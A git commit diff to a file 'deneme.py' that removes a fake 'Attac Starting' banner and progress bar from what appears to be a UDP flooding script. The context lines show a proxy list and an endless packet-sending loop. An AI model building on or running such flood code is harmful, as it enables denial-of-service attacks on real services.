0dcd67754061ed82ac54433f72d9451c2a47812e
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-21 16:15:27 +0300

    Update deneme.py

--- deneme.py
+++ deneme.py
@@ -333,18 +333,7 @@ in_file.close()
 
 listaproxy = proxyf.split('\n')
 
-os.system("clear")
-os.system("figlet Attac Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
